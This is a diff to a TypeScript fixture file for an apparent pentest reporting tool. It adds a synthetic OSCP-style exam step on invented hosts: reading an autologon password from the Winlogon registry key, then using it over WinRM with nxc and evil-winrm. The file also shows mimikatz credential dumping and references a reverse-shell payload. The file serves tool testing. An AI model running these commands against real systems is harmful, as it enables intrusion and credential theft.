@@ -1,5 +1,7 @@
 // The mock exam (e-exam) as a real exam run reads: three standalone machines (ms01 and web01 rooted, lnx02 never
-// started) and an AD set (ad02 entered with the provided credentials, dc01 taken with a cached Domain Admin hash).
+// started) and an AD set of three (ad02 entered with the provided credentials; app03 reached with an autologon password
+// found on ad02, which no finding covers; dc01 taken with a cached Domain Admin hash). The report holds one appendix
+// page and one free page the owner wrote.
 // Realistic commands and output, screenshots rendered from the same text (src/audit/images/shots.mjs), a modified
 // public exploit with its original, failed attempts of every public kind, and private items that must never reach
 // the report. Synthetic throughout: invented 10.10.30.x targets, the RFC 5737 attacker 192.0.2.10, made-up secrets.
@@ -10,7 +12,8 @@ import type { FailedAttempt, Finding, FindingFile } from "../types/findings";
 import type { CommandBlock, LogEntry } from "../types/log";
 import type { Hop } from "../types/network";
 import type { Note, RuledOut } from "../types/notes";
-import type { Report } from "../types/report";
+import type { Report, ReportSection } from "../types/report";
+import { DRAFT_LAYOUT } from "../engines/report/types";
 import type { Service } from "../types/service";
 import { DA_NTLM, FLAGS, OUTPUT, PROOF, REVERSE_SHELL_B64 } from "./examTexts";
 
@@ -20,6 +23,7 @@ const WEB = "h-exam-web";
 const LNX = "h-exam-lnx";
 const AD02 = "h-exam-ad02";
 const DC01 = "h-exam-dc01";
+const APP03 = "h-exam-app03";
 
 /** The exam's entries are placed by minutes before `now`. */
 export function examFixtures(now: number) {
@@ -163,6 +167,19 @@ export function examFixtures(now: number) {
     { command: "evil-winrm -i 10.10.30.11 -u svc_deploy -p 'D3ploy!2026'", output: "Evil-WinRM shell v3.5\n\nInfo: Establishing connection to remote endpoint" },
     { command: 'whoami /groups | findstr /i "Administrators"', shell: "evil-winrm", output: "BUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner" },
   ]);
+  // An autologon password on ad02 that gets onto app03: a credential that moved, with no finding of its own.
+  cmd("ad02-winlogon", 49, "Autologon password in the Winlogon key on ad02", [AD02], [{
+    command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword', shell: "evil-winrm",
+    output: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    DefaultUserName    REG_SZ    m.ross\n    DefaultPassword    REG_SZ    Kiosk#Logon26",
+  }], { ranOn: "ad02" });
+  const appNmap = cmd("app03-nmap", 48, "Full TCP scan of app03", [APP03], [{ command: "nmap -p- -sV --min-rate 3000 -oN scans/app03.nmap 10.10.30.12", output: APP03_NMAP }]);
+  const appWinrm = cmd("app03-winrm", 47, "WinRM to app03 as m.ross", [APP03], [
+    {
+      command: "nxc winrm 10.10.30.12 -u m.ross -p 'Kiosk#Logon26'",
+      output: "WINRM       10.10.30.12     5985   APP03            [*] Windows 10 / Server 2019 Build 17763 (name:APP03) (domain:exam.corp)\nWINRM       10.10.30.12     5985   APP03            [+] exam.corp\\m.ross:Kiosk#Logon26 (Pwn3d!)",
+    },
+    { command: "evil-winrm -i 10.10.30.12 -u m.ross -p 'Kiosk#Logon26'", output: "Evil-WinRM shell v3.5\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\m.ross\\Documents> whoami\nexam\\m.ross" },
+  ]);
   const mimikatz = cmd("ad02-mimikatz", 46, "Cached Domain Admin logon on ad02", [AD02], [{
     command: '.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', shell: "evil-winrm",
     output: MIMIKATZ,
@@ -197,6 +214,9 @@ export function examFixtures(now: number) {
     svc(AD02, 445, "microsoft-ds?", null),
     svc(AD02, 3389, "ms-wbt-server", "Microsoft Terminal Services"),
     svc(AD02, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
+    svc(APP03, 135, "msrpc", "Microsoft Windows RPC"),
+    svc(APP03, 445, "microsoft-ds?", null),
+    svc(APP03, 5985, "http", "Microsoft HTTPAPI httpd 2.0"),
     svc(DC01, 53, "domain", "Simple DNS Plus"),
     svc(DC01, 88, "kerberos-sec", "Microsoft Windows Kerberos"),
     svc(DC01, 389, "ldap", "Microsoft Windows Active Directory LDAP (Domain: exam.corp)"),
@@ -293,6 +313,7 @@ export function examFixtures(now: number) {
     { id: "u-exam-root", engagementId: E, username: "root", domain: null, sourceHostId: WEB, source: null, createdAt: ago(79) },
     { id: "u-exam-jellis", engagementId: E, username: "j.ellis", domain: "EXAM", sourceHostId: null, source: "provided by the exam", createdAt: ago(180) },
     { id: "u-exam-deploy", engagementId: E, username: "svc_deploy", domain: "EXAM", sourceHostId: AD02, source: "deploy.ps1", createdAt: ago(55) },
+    { id: "u-exam-mross", engagementId: E, username: "m.ross", domain: "EXAM", sourceHostId: AD02, source: "Winlogon autologon", createdAt: ago(49) },
     { id: "u-exam-da", engagementId: E, username: "da_admin", domain: "EXAM", sourceHostId: AD02, source: "mimikatz on ad02", createdAt: ago(46) },
   ];
   const grant = (id: string, usernameId: string, hostId: string, level: AccessGrant["level"], via: string, logEntryId: string, min: number): AccessGrant => ({
@@ -305,10 +326,12 @@ export function examFixtures(now: number) {
     grant("web01-root", "u-exam-root", WEB, "system", "sudo tar", tar, 79),
     grant("ad02-user", "u-exam-jellis", AD02, "user", "Provided credentials over WinRM", winrm, 62),
     grant("ad02-admin", "u-exam-deploy", AD02, "admin", "svc_deploy password from deploy.ps1", admin, 50),
+    grant("app03-user", "u-exam-mross", APP03, "user", "WinRM as m.ross", appWinrm, 47),
     grant("dc01-system", "u-exam-da", DC01, "system", "Pass the hash as da_admin (psexec)", psexec, 38),
   ];
   const hops: Hop[] = [
     { id: "hp-exam-1", engagementId: E, fromHostId: null, toHostId: AD02, via: "Provided credentials for j.ellis over WinRM", logEntryId: winrm, at: ago(62), updatedAt: ago(62) },
+    { id: "hp-exam-3", engagementId: E, fromHostId: AD02, toHostId: APP03, via: "WinRM as m.ross", logEntryId: appWinrm, at: ago(47), updatedAt: ago(47) },
     { id: "hp-exam-2", engagementId: E, fromHostId: AD02, toHostId: DC01, via: "Pass the hash as da_admin (psexec)", logEntryId: psexec, at: ago(38), updatedAt: ago(38) },
   ];
   const cred = (id: string, type: Credential["type"], username: string, secret: string, over: Partial<Credential>): Credential => ({
@@ -319,6 +342,7 @@ export function examFixtures(now: number) {
     cred("jellis", "password", "j.ellis", "Welcome2026!", { source: "Provided by the exam", createdAt: ago(180) }),
     cred("umbraco", "password", "admin@exam.corp", "Spring2026!", { domain: null, scope: "local", localHostId: MS01, sourceHostId: MS01, source: "/backup/notes.txt" }),
     cred("deploy", "password", "svc_deploy", "D3ploy!2026", { sourceHostId: AD02, source: "C:\\Scripts\\deploy.ps1" }),
+    cred("mross", "password", "m.ross", "Kiosk#Logon26", { sourceHostId: AD02, source: "Winlogon DefaultPassword", createdAt: ago(49), updatedAt: ago(49) }),
     cred("da", "hash", "da_admin", DA_NTLM, { hashType: "NTLM", crackStatus: "uncracked", sourceHostId: AD02, source: "mimikatz sekurlsa::logonpasswords" }),
   ];
 
@@ -337,6 +361,7 @@ export function examFixtures(now: number) {
     tick(WEB, "h-pe-lin-sudo", sudo, 82),
     tick(AD02, "h-enum-full-tcp", adNmap, 72),
     tick(DC01, "h-enum-full-tcp", dcNmap, 70),
+    tick(APP03, "h-enum-full-tcp", appNmap, 48),
   ];
   const notes: Note[] = [
     { ownerId: MS01, engagementId: E, hostId: MS01, body: "Umbraco 7.12.4 on 80. Creds in /backup/notes.txt. SeImpersonate on the app pool.", private: false, updatedAt: ago(130) },
@@ -347,12 +372,27 @@ export function examFixtures(now: number) {
     { id: "cl-exam-2", engagementId: E, hostId: MS01, kind: "file", target: "C:\\Windows\\Tasks\\PrintSpoofer32.exe", notes: null, sourceEntryId: x86, suggestionKey: null, status: "removed", removedAt: ago(100), createdAt: ago(118), updatedAt: ago(100) },
     { id: "cl-exam-3", engagementId: E, hostId: AD02, kind: "file", target: "C:\\Users\\svc_deploy\\Documents\\mimikatz.exe", notes: null, sourceEntryId: mimikatz, suggestionKey: null, status: "open", removedAt: null, createdAt: ago(46), updatedAt: ago(46) },
   ];
-  // The report exists (details from Settings) with no sections yet, so opening it drafts every page.
+  // The report exists (details from Settings) with only the owner's two pages, so opening it drafts every other page.
   const reports: Report[] = [
     { id: "rep-exam", engagementId: E, candidateName: "Sam Rivera", email: "sam.rivera@example.com", osid: "OS-48213", title: "OSCP Exam Report", meta: {}, createdAt: ago(20), updatedAt: ago(20), exportedAt: null },
   ];
+  const page = (id: string, position: number, title: string, placement: "appendix" | "body", text: string[]): ReportSection => ({
+    id: `rs-exam-${id}`, reportId: "rep-exam", kind: "page", targetKey: `page-${id}`, position,
+    doc: { type: "doc", content: text.map((t) => ({ type: "paragraph", content: [{ type: "text", text: t }] })) },
+    meta: { title, placement, layout: DRAFT_LAYOUT }, draftBuiltAt: ago(15), updatedAt: ago(15),
+  });
+  const reportSections: ReportSection[] = [
+    page("tools", 100, "Tools and versions", "body", [
+      "Every tool ran from the attacking machine at 192.0.2.10 (Kali 2026.3) unless the step says otherwise.",
+      "nmap 7.94SVN, feroxbuster 2.10.4, impacket 0.12.0, NetExec 1.3.0, evil-winrm 3.5, mimikatz 2.2.0, PrintSpoofer 1.0.",
+    ]),
+    page("wordlists", 101, "Wordlists", "appendix", [
+      "Content discovery: SecLists raft-small-directories.txt and common.txt.",
+      "Password guessing and cracking: SecLists 10k-most-common.txt and rockyou.txt.",
+    ]),
+  ];
 
-  return { log, services, findings, findingFiles, failedAttempts, ruledOut, usernames, accessGrants, hops, credentials, checklist, notes, cleanup, reports };
+  return { reportSections, log, services, findings, findingFiles, failedAttempts, ruledOut, usernames, accessGrants, hops, credentials, checklist, notes, cleanup, reports };
 }
 
 // ------------------------------------------------------------ long text
@@ -448,6 +488,18 @@ PORT     STATE SERVICE       VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Nmap done: 1 IP address (1 host up) scanned in 101.92 seconds`;
+
+const APP03_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 13:12 UTC
+Nmap scan report for 10.10.30.12
+Host is up (0.031s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap done: 1 IP address (1 host up) scanned in 104.21 seconds`;
 
 const DC01_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 12:50 UTC
 Nmap scan report for 10.10.30.10
